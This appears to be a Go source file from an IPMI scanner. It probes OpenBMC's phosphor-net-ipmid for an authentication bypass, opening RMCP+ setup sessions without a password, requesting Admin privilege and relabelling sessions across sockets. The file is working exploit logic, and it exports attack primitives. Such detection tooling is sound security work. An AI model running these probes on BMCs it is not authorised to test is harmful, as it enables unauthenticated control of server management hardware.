package ipmi

import (
	"bytes"
	"crypto/rand"
	"encoding/binary"
	"errors"
	"fmt"
	"time"
)

// OpenBMCSetupProbe captures the read-only local-command reachability observed
// after Open Session + RAKP-1, before RAKP-3 proves the account password.
type OpenBMCSetupProbe struct {
	Username                     string `json:"username"`
	Suite                        int    `json:"suite,omitempty"`
	AuthAlgo                     byte   `json:"authAlgo,omitempty"`
	IntegrityAlgo                byte   `json:"integrityAlgo,omitempty"`
	ConfAlgo                     byte   `json:"confAlgo,omitempty"`
	BMCSID                       uint32 `json:"bmcSid"`
	RAKPStatus                   byte   `json:"rakpStatus"`
	RAKPHMACLen                  int    `json:"rakpHmacLen"`
	OpenSessionOnlyRejected      bool   `json:"openSessionOnlyRejected"`
	OpenSessionOnlyPrivQueryCC   byte   `json:"openSessionOnlyPrivQueryCc,omitempty"`
	OpenSessionOnlyError         string `json:"openSessionOnlyError,omitempty"`
	PrePrivQueryCC               byte   `json:"prePrivQueryCc,omitempty"`
	PrePrivQueryData             []byte `json:"prePrivQueryData,omitempty"`
	SetPrivAdminCC               byte   `json:"setPrivAdminCc,omitempty"`
	SetPrivAdminData             []byte `json:"setPrivAdminData,omitempty"`
	PayloadStatusCC              byte   `json:"payloadStatusCc,omitempty"`
	PayloadStatusData            []byte `json:"payloadStatusData,omitempty"`
	PayloadInfoCC                byte   `json:"payloadInfoCc,omitempty"`
	PayloadInfoData              []byte `json:"payloadInfoData,omitempty"`
	SetupCommandsWork            bool   `json:"setupCommandsWork"`
	AdminPrivAccepted            bool   `json:"adminPrivAccepted"`
	CrossSocketRAKPStatus        byte   `json:"crossSocketRakpStatus,omitempty"`
	CrossSocketRAKPHMACLen       int    `json:"crossSocketRakpHmacLen,omitempty"`
	CrossSocketPrivQueryCC       byte   `json:"crossSocketPrivQueryCc,omitempty"`
	CrossSocketPrivQueryData     []byte `json:"crossSocketPrivQueryData,omitempty"`
	CrossSocketSetPrivAdminCC    byte   `json:"crossSocketSetPrivAdminCc,omitempty"`
	CrossSocketSetPrivAdminData  []byte `json:"crossSocketSetPrivAdminData,omitempty"`
	CrossSocketSetupCommandsWork bool   `json:"crossSocketSetupCommandsWork"`
	CrossSocketError             string `json:"crossSocketError,omitempty"`
	CloseSetupCC                 byte   `json:"closeSetupCc,omitempty"`
	CloseSetupError              string `json:"closeSetupError,omitempty"`
	Error                        string `json:"error,omitempty"`
}

// OpenBMCDisabledSetupOverwriteProbe captures whether a setup slot that first
// saw a disabled-user RAKP1 can be overwritten by a second RAKP1 naming an
// enabled Admin user, allowing setup-state local commands before any password is
// proven.
type OpenBMCDisabledSetupOverwriteProbe struct {
	DisabledUsername           string `json:"disabledUsername"`
	AdminUsername              string `json:"adminUsername"`
	Suite                      int    `json:"suite,omitempty"`
	BMCSID                     uint32 `json:"bmcSid"`
	DisabledRAKPStatus         byte   `json:"disabledRakpStatus"`
	DisabledRAKPHMACLen        int    `json:"disabledRakpHmacLen"`
	DisabledPrivQueryCC        byte   `json:"disabledPrivQueryCc,omitempty"`
	DisabledSetPrivAdminCC     byte   `json:"disabledSetPrivAdminCc,omitempty"`
	DisabledCommandsWork       bool   `json:"disabledCommandsWork"`
	AdminRAKPStatus            byte   `json:"adminRakpStatus"`
	AdminRAKPHMACLen           int    `json:"adminRakpHmacLen"`
	AfterPrivQueryCC           byte   `json:"afterPrivQueryCc,omitempty"`
	AfterPrivQueryData         []byte `json:"afterPrivQueryData,omitempty"`
	AfterSetPrivAdminCC        byte   `json:"afterSetPrivAdminCc,omitempty"`
	AfterSetPrivAdminData      []byte `json:"afterSetPrivAdminData,omitempty"`
	SetupOverwriteCommandsWork bool   `json:"setupOverwriteCommandsWork"`
	CloseSetupCC               byte   `json:"closeSetupCc,omitempty"`
	CloseSetupError            string `json:"closeSetupError,omitempty"`
	Error                      string `json:"error,omitempty"`
}

// OpenBMCSetupSession is a half-authenticated RMCP+ setup session after Open
// Session + RAKP-1, before RAKP-3. Vulnerable phosphor-net-ipmid builds execute
// local session commands in this state.
type OpenBMCSetupSession struct {
	client  *Client
	bmcSID  uint32
	rqSeq   byte
	setPriv []SetPrivAttempt
}

// OpenOpenBMCSetupSession opens a half-authenticated setup session for an
// enabled username without proving the password.
func OpenOpenBMCSetupSession(host string, port int, username string, suite CipherAlgos, timeout time.Duration) (*OpenBMCSetupSession, error) {
	if username == "" {
		return nil, errors.New("openbmc setup session: username required")
	}
	if timeout == 0 {
		timeout = 5 * time.Second
	}
	c, err := NewClient(host, port, timeout)
	if err != nil {
		return nil, err
	}
	_, bmcSID, err := openSession20Setup(c, suite)
	if err != nil {
		c.Close()
		return nil, fmt.Errorf("open-session: %w", err)
	}
	cRand := make([]byte, 16)
	if _, err := rand.Read(cRand); err != nil {
		_, _ = closeSetupSession(c, bmcSID)
		c.Close()
		return nil, err
	}
	r2, err := sendRAKP1OnSession(c, bmcSID, cRand, username, 0x14)
	if err != nil {
		_, _ = closeSetupSession(c, bmcSID)
		c.Close()
		return nil, fmt.Errorf("rakp1: %w", err)
	}
	if r2 == nil || r2.ErrorCode != 0 {
		_, _ = closeSetupSession(c, bmcSID)
		c.Close()
		if r2 != nil {
			return nil, fmt.Errorf("rakp2 status=0x%02x", r2.ErrorCode)
		}
		return nil, errors.New("rakp2 unavailable")
	}
	return &OpenBMCSetupSession{client: c, bmcSID: bmcSID, rqSeq: 1}, nil
}

func (s *OpenBMCSetupSession) Exec(netfn, cmd byte, data []byte) (byte, []byte, error) {
	if s == nil || s.client == nil {
		return 0xff, nil, errors.New("openbmc setup session: closed")
	}
	rqSeq := s.rqSeq
	s.rqSeq = (s.rqSeq + 1) & 0x3f
	if s.rqSeq == 0 {
		s.rqSeq = 1
	}
	return execSetupClear(s.client, s.bmcSID, netfn, cmd, data, rqSeq)
}

func (s *OpenBMCSetupSession) RequestSessionPrivilege(requested byte) (SetPrivAttempt, error) {
	at := SetPrivAttempt{Requested: requested, Name: setPrivName(requested)}
	cc, data, err := s.Exec(NetFnApp, CmdSetSessionPrivilege, []byte{requested})
	if err != nil {
		at.Error = err.Error()
		s.setPriv = append(s.setPriv, at)
		return at, err
	}
	at.CC = cc
	at.Success = cc == 0x00
	if len(data) >= 1 {
		at.Granted = data[0]
	}
	if cc != 0x00 {
		at.Error = fmt.Sprintf("cc=0x%02x", cc)
	}
	s.setPriv = append(s.setPriv, at)
	return at, nil
}

func (s *OpenBMCSetupSession) SetPrivilegeAttempts() []SetPrivAttempt {
	if s == nil || len(s.setPriv) == 0 {
		return nil
	}
	out := make([]SetPrivAttempt, len(s.setPriv))
	copy(out, s.setPriv)
	return out
}

func (s *OpenBMCSetupSession) Close() {
	if s == nil || s.client == nil {
		return
	}
	_, _ = closeSetupSession(s.client, s.bmcSID)
	_ = s.client.Close()
	s.client = nil
}

// ProbeOpenBMCSetupState opens a setup session, sends RAKP-1 for a known enabled
// username, and checks whether phosphor-net-ipmid local session commands execute
// before RAKP-3. The probe is intentionally read-only except for Set Session
// Privilege on the transient setup session and best-effort Close Session cleanup.
func ProbeOpenBMCSetupState(host string, port int, username string, suite CipherAlgos, timeout time.Duration) (*OpenBMCSetupProbe, error) {
	if username == "" {
		return nil, errors.New("openbmc setup probe: username required")
	}
	if timeout == 0 {
		timeout = 5 * time.Second
	}
	c, err := NewClient(host, port, timeout)
	if err != nil {
		return nil, err
	}
	defer c.Close()

	probe := &OpenBMCSetupProbe{Username: username, Suite: suite.Suite, AuthAlgo: suite.Auth, IntegrityAlgo: suite.Integrity, ConfAlgo: suite.Conf}
	probeOpenSessionOnlyControl(host, port, suite, timeout, probe)
	cSID, bmcSID, err := openSession20Setup(c, suite)
	_ = cSID
	if err != nil {
		probe.Error = "open-session: " + err.Error()
		return probe, err
	}
	probe.BMCSID = bmcSID

	cRand := make([]byte, 16)
	if _, err := rand.Read(cRand); err != nil {
		probe.Error = "client-random: " + err.Error()
		return probe, err
	}
	r2, err := sendRAKP1OnSession(c, bmcSID, cRand, username, 0x14)
	if err != nil {
		probe.Error = "rakp1: " + err.Error()
		_, _ = closeSetupSession(c, bmcSID)
		return probe, err
	}
	probe.RAKPStatus = r2.ErrorCode
	probe.RAKPHMACLen = len(r2.RAKPHash)
	if r2.ErrorCode != 0 {
		probe.Error = fmt.Sprintf("rakp2 status=0x%02x", r2.ErrorCode)
		_, _ = closeSetupSession(c, bmcSID)
		return probe, nil
	}

	cc, data, err := execSetupClear(c, bmcSID, NetFnApp, CmdSetSessionPrivilege, []byte{0x00}, 10)
	if err == nil {
		probe.PrePrivQueryCC = cc
		probe.PrePrivQueryData = append([]byte(nil), data...)
	} else if probe.Error == "" {
		probe.Error = "pre-priv-query: " + err.Error()
	}
	cc, data, err = execSetupClear(c, bmcSID, NetFnApp, CmdSetSessionPrivilege, []byte{0x04}, 11)
	if err == nil {
		probe.SetPrivAdminCC = cc
		probe.SetPrivAdminData = append([]byte(nil), data...)
		probe.AdminPrivAccepted = cc == 0x00
	} else if probe.Error == "" {
		probe.Error = "set-priv-admin: " + err.Error()
	}
	cc, data, err = execSetupClear(c, bmcSID, NetFnApp, CmdGetPayloadStatus, []byte{0x01}, 12)
	if err == nil {
		probe.PayloadStatusCC = cc
		probe.PayloadStatusData = append([]byte(nil), data...)
	} else if probe.Error == "" {
		probe.Error = "get-payload-status: " + err.Error()
	}
	cc, data, err = execSetupClear(c, bmcSID, NetFnApp, CmdGetPayloadInfo, []byte{0x01, 0x00}, 13)
	if err == nil {
		probe.PayloadInfoCC = cc
		probe.PayloadInfoData = append([]byte(nil), data...)
	} else if probe.Error == "" {
		probe.Error = "get-payload-info: " + err.Error()
	}
	probe.SetupCommandsWork = probe.PrePrivQueryCC == 0x00 || probe.SetPrivAdminCC == 0x00 || probe.PayloadStatusCC == 0x00 || probe.PayloadInfoCC == 0x00
	probeCrossSocketSetup(host, port, username, suite, timeout, probe)

	if cc, err := closeSetupSession(c, bmcSID); err == nil {
		probe.CloseSetupCC = cc
	} else {
		probe.CloseSetupError = err.Error()
	}
	return probe, nil
}

// ProbeOpenBMCDisabledSetupOverwrite tests whether a setup session that first
// hit a disabled-user RAKP1 can be relabeled by another RAKP1 naming an enabled
// Admin user. It requires no valid password and only sends local setup-session
// commands against a scanner-created setup slot.
func ProbeOpenBMCDisabledSetupOverwrite(host string, port int, disabledUsername, adminUsername string, suite CipherAlgos, timeout time.Duration) (*OpenBMCDisabledSetupOverwriteProbe, error) {
	if disabledUsername == "" {
		return nil, errors.New("openbmc disabled-overwrite probe: disabled username required")
	}
	if adminUsername == "" {
		return nil, errors.New("openbmc disabled-overwrite probe: admin username required")
	}
	if timeout == 0 {
		timeout = 5 * time.Second
	}
	owner, err := NewClient(host, port, timeout)
	if err != nil {
		return nil, err
	}
	defer owner.Close()

	probe := &OpenBMCDisabledSetupOverwriteProbe{DisabledUsername: disabledUsername, AdminUsername: adminUsername, Suite: suite.Suite}
	_, bmcSID, err := openSession20Setup(owner, suite)
	if err != nil {
		probe.Error = "open-session: " + err.Error()
		return probe, err
	}
	probe.BMCSID = bmcSID

	disabledRand := make([]byte, 16)
	if _, err := rand.Read(disabledRand); err != nil {
		probe.Error = "disabled-client-random: " + err.Error()
		_, _ = closeSetupSession(owner, bmcSID)
		return probe, err
	}
	r2, err := sendRAKP1OnSession(owner, bmcSID, disabledRand, disabledUsername, 0x14)
	if err != nil {
		probe.Error = "disabled-rakp1: " + err.Error()
		_, _ = closeSetupSession(owner, bmcSID)
		return probe, err
	}
	probe.DisabledRAKPStatus = r2.ErrorCode
	probe.DisabledRAKPHMACLen = len(r2.RAKPHash)

	cc, _, err := execSetupClear(owner, bmcSID, NetFnApp, CmdSetSessionPrivilege, []byte{0x00}, 10)
	if err == nil {
		probe.DisabledPrivQueryCC = cc
	} else if probe.Error == "" {
		probe.Error = "disabled-priv-query: " + err.Error()
	}
	cc, _, err = execSetupClear(owner, bmcSID, NetFnApp, CmdSetSessionPrivilege, []byte{0x04}, 11)
	if err == nil {
		probe.DisabledSetPrivAdminCC = cc
	} else if probe.Error == "" {
		probe.Error = "disabled-set-priv-admin: " + err.Error()
	}
	probe.DisabledCommandsWork = probe.DisabledPrivQueryCC == 0x00 || probe.DisabledSetPrivAdminCC == 0x00

	attacker, err := NewClient(host, port, timeout)
	if err != nil {
		probe.Error = "admin-client: " + err.Error()
		_, _ = closeSetupSession(owner, bmcSID)
		return probe, err
	}
	defer attacker.Close()
	adminRand := make([]byte, 16)
	if _, err := rand.Read(adminRand); err != nil {
		probe.Error = "admin-client-random: " + err.Error()
		_, _ = closeSetupSession(owner, bmcSID)
		return probe, err
	}
	r2, err = sendRAKP1OnSession(attacker, bmcSID, adminRand, adminUsername, 0x14)
	if err != nil {
		probe.Error = "admin-rakp1: " + err.Error()
		_, _ = closeSetupSession(owner, bmcSID)
		return probe, err
	}
	probe.AdminRAKPStatus = r2.ErrorCode
	probe.AdminRAKPHMACLen = len(r2.RAKPHash)
	if r2.ErrorCode != 0 {
		probe.Error = fmt.Sprintf("admin-rakp2 status=0x%02x", r2.ErrorCode)
		_, _ = closeSetupSession(owner, bmcSID)
		return probe, nil
	}

	cc, data, err := execSetupClear(attacker, bmcSID, NetFnApp, CmdSetSessionPrivilege, []byte{0x00}, 12)
	if err == nil {
		probe.AfterPrivQueryCC = cc
		probe.AfterPrivQueryData = append([]byte(nil), data...)
	} else if probe.Error == "" {
		probe.Error = "after-priv-query: " + err.Error()
	}
	cc, data, err = execSetupClear(attacker, bmcSID, NetFnApp, CmdSetSessionPrivilege, []byte{0x04}, 13)
	if err == nil {
		probe.AfterSetPrivAdminCC = cc
		probe.AfterSetPrivAdminData = append([]byte(nil), data...)
	} else if probe.Error == "" {
		probe.Error = "after-set-priv-admin: " + err.Error()
	}
	probe.SetupOverwriteCommandsWork = !probe.DisabledCommandsWork && (probe.AfterPrivQueryCC == 0x00 || probe.AfterSetPrivAdminCC == 0x00)
	if cc, err := closeSetupSession(attacker, bmcSID); err == nil {
		probe.CloseSetupCC = cc
	} else {
		probe.CloseSetupError = err.Error()
	}
	return probe, nil
}

func probeOpenSessionOnlyControl(host string, port int, suite CipherAlgos, timeout time.Duration, probe *OpenBMCSetupProbe) {
	c, err := NewClient(host, port, timeout)
	if err != nil {
		probe.OpenSessionOnlyError = err.Error()
		probe.OpenSessionOnlyRejected = true
		return
	}
	defer c.Close()
	_, bmcSID, err := openSession20Setup(c, suite)
	if err != nil {
		probe.OpenSessionOnlyError = err.Error()
		probe.OpenSessionOnlyRejected = true
		return
	}
	cc, _, err := execSetupClear(c, bmcSID, NetFnApp, CmdSetSessionPrivilege, []byte{0x00}, 9)
	if err != nil {
		probe.OpenSessionOnlyError = err.Error()
		probe.OpenSessionOnlyRejected = true
		return
	}
	probe.OpenSessionOnlyPrivQueryCC = cc
	probe.OpenSessionOnlyRejected = cc != 0x00
}

func probeCrossSocketSetup(host string, port int, username string, suite CipherAlgos, timeout time.Duration, probe *OpenBMCSetupProbe) {
	owner, err := NewClient(host, port, timeout)
	if err != nil {
		probe.CrossSocketError = err.Error()
		return
	}
	defer owner.Close()
	_, bmcSID, err := openSession20Setup(owner, suite)
	if err != nil {
		probe.CrossSocketError = "open-session: " + err.Error()
		return
	}
	attacker, err := NewClient(host, port, timeout)
	if err != nil {
		probe.CrossSocketError = err.Error()
		_, _ = closeSetupSession(owner, bmcSID)
		return
	}
	defer attacker.Close()
	cRand := make([]byte, 16)
	if _, err := rand.Read(cRand); err != nil {
		probe.CrossSocketError = "client-random: " + err.Error()
		_, _ = closeSetupSession(owner, bmcSID)
		return
	}
	r2, err := sendRAKP1OnSession(attacker, bmcSID, cRand, username, 0x14)
	if err != nil {
		probe.CrossSocketError = "rakp1: " + err.Error()
		_, _ = closeSetupSession(owner, bmcSID)
		return
	}
	probe.CrossSocketRAKPStatus = r2.ErrorCode
	probe.CrossSocketRAKPHMACLen = len(r2.RAKPHash)
	if r2.ErrorCode != 0 {
		probe.CrossSocketError = fmt.Sprintf("rakp2 status=0x%02x", r2.ErrorCode)
		_, _ = closeSetupSession(owner, bmcSID)
		return
	}
	cc, data, err := execSetupClear(attacker, bmcSID, NetFnApp, CmdSetSessionPrivilege, []byte{0x00}, 10)
	if err == nil {
		probe.CrossSocketPrivQueryCC = cc
		probe.CrossSocketPrivQueryData = append([]byte(nil), data...)
	} else if probe.CrossSocketError == "" {
		probe.CrossSocketError = "priv-query: " + err.Error()
	}
	cc, data, err = execSetupClear(attacker, bmcSID, NetFnApp, CmdSetSessionPrivilege, []byte{0x04}, 11)
	if err == nil {
		probe.CrossSocketSetPrivAdminCC = cc
		probe.CrossSocketSetPrivAdminData = append([]byte(nil), data...)
	} else if probe.CrossSocketError == "" {
		probe.CrossSocketError = "set-priv-admin: " + err.Error()
	}
	probe.CrossSocketSetupCommandsWork = probe.CrossSocketPrivQueryCC == 0x00 || probe.CrossSocketSetPrivAdminCC == 0x00
	_, _ = closeSetupSession(attacker, bmcSID)
}

func openSession20Setup(c *Client, suite CipherAlgos) (uint32, uint32, error) {
	var cSID uint32
	_ = binary.Read(rand.Reader, binary.LittleEndian, &cSID)
	if cSID == 0 {
		cSID = 0xa0a2a3a4
	}
	var os bytes.Buffer
	os.WriteByte(0x00)
	os.WriteByte(0x04)
	os.Write([]byte{0x00, 0x00})
	_ = binary.Write(&os, binary.LittleEndian, cSID)
	os.Write([]byte{0x00, 0x00, 0x00, 0x08, suite.Auth, 0, 0, 0})
	os.Write([]byte{0x01, 0x00, 0x00, 0x08, suite.Integrity, 0, 0, 0})
	os.Write([]byte{0x02, 0x00, 0x00, 0x08, suite.Conf, 0, 0, 0})
	reply, err := c.Send(buildRMCPPlus(PayloadOpenSessionReq, 0, 0, os.Bytes()))
	if err != nil {
		return 0, 0, err
	}
	bmcSID, err := parseOpenSessionResp(reply)
	if err != nil {
		return 0, 0, err
	}
	return cSID, bmcSID, nil
}

func sendRAKP1OnSession(c *Client, bmcSID uint32, cRand []byte, username string, role byte) (*RAKPResult, error) {
	var r1 bytes.Buffer
	r1.WriteByte(0x00)
	r1.Write([]byte{0, 0, 0})
	_ = binary.Write(&r1, binary.LittleEndian, bmcSID)
	r1.Write(cRand)
	r1.WriteByte(role)
	r1.Write([]byte{0, 0})
	r1.WriteByte(byte(len(username)))
	r1.WriteString(username)
	reply, err := c.Send(buildRMCPPlus(PayloadRAKP1, 0, 0, r1.Bytes()))
	if err != nil {
		return nil, err
	}
	out := &RAKPResult{Username: username, BMCSID: bmcSID, ClientRand: append([]byte(nil), cRand...), RAKP2Raw: reply}
	if err := parseRAKP2(reply, out); err != nil && out.ErrorCode == 0 {
		return out, err
	}
	return out, nil
}

func execSetupClear(c *Client, bmcSID uint32, netfn, cmd byte, data []byte, rqSeq byte) (byte, []byte, error) {
	lan := buildSessionLANMsg(netfn, cmd, data, rqSeq)
	pkt := buildRMCPPlusSID(PayloadIPMI, bmcSID, 0, lan)
	reply, err := c.Send(pkt)
	if err != nil {
		return 0xff, nil, err
	}
	body, err := rmcpPlusPayload(reply)
	if err != nil {
		return 0xff, nil, err
	}
	out, cc, ok := extractIPMIData(body)
	if !ok {
		return 0xff, nil, errors.New("unparseable setup ipmi payload")
	}
	return cc, out, nil
}

// ExecClearIPMI sends a single cleartext IPMI command on an existing RMCP+
// session (no integrity or confidentiality wrapping). It is the exported form of
// the internal execSetupClear used by the setup-state probes. The caller is
// responsible for sequencing rqSeq values (1-63, wrapping).
func ExecClearIPMI(c *Client, bmcSID uint32, netfn, cmd byte, data []byte, rqSeq byte) (byte, []byte, error) {
	return execSetupClear(c, bmcSID, netfn, cmd, data, rqSeq)
}

// SendRAKP1ToSession sends a RAKP1 message targeting an existing bmcSID (rather
// than requiring a preceding Open Session on the same connection). This is the
// exported form used by checks that perform cross-socket / cross-session RAKP1
// relabelling attacks.
func SendRAKP1ToSession(c *Client, bmcSID uint32, cRand []byte, username string, role byte) (*RAKPResult, error) {
	return sendRAKP1OnSession(c, bmcSID, cRand, username, role)
}

// CloseSetupSession best-effort closes an RMCP+ setup/active session using the
// local Close Session command over the given BMC session ID. It is exported for
// low-level checks that craft RAKP packets manually and want to release the slot
// on error paths. Whether a half-open session is releasable this way is
// stack-dependent -- see abortSetupSession -- so the returned completion code is
// the only evidence that it worked.
func CloseSetupSession(c *Client, bmcSID uint32) (byte, error) {
	return closeSetupSession(c, bmcSID)
}

func closeSetupSession(c *Client, bmcSID uint32) (byte, error) {
	cc, _, err := execSetupClear(c, bmcSID, NetFnApp, CmdCloseSession, binary.LittleEndian.AppendUint32(nil, bmcSID), 63)
	return cc, err
}

// CloseSetupSessionAsync sends Close Session without waiting for the reply. In a
// tight candidate loop (the OpenBMC default-userKey heap sweep closes a setup
// session per guess) waiting adds a full round trip -- or, when the reply is
// dropped, a full timeout -- to every iteration. Use this wherever the close is
// housekeeping rather than an observation; discarding the reply also discards the
// only signal that the stack honored it.
func CloseSetupSessionAsync(c *Client, bmcSID uint32) error {
	lan := buildSessionLANMsg(NetFnApp, CmdCloseSession, binary.LittleEndian.AppendUint32(nil, bmcSID), 63)
	return c.SendRaw(buildRMCPPlusSID(PayloadIPMI, bmcSID, 0, lan))
}

func buildRMCPPlusSID(payloadType byte, sid uint32, seq uint32, body []byte) []byte {
	var b bytes.Buffer
	b.Write([]byte{RMCPVersion, RMCPReserved, RMCPSeqNoAck, RMCPClassIPMI})
	b.WriteByte(IPMI20Format)
	b.WriteByte(payloadType & 0x3f)
	b.Write(binary.LittleEndian.AppendUint32(nil, sid))
	b.Write(binary.LittleEndian.AppendUint32(nil, seq))
	b.Write(binary.LittleEndian.AppendUint16(nil, uint16(len(body))))
	b.Write(body)
	return b.Bytes()
}
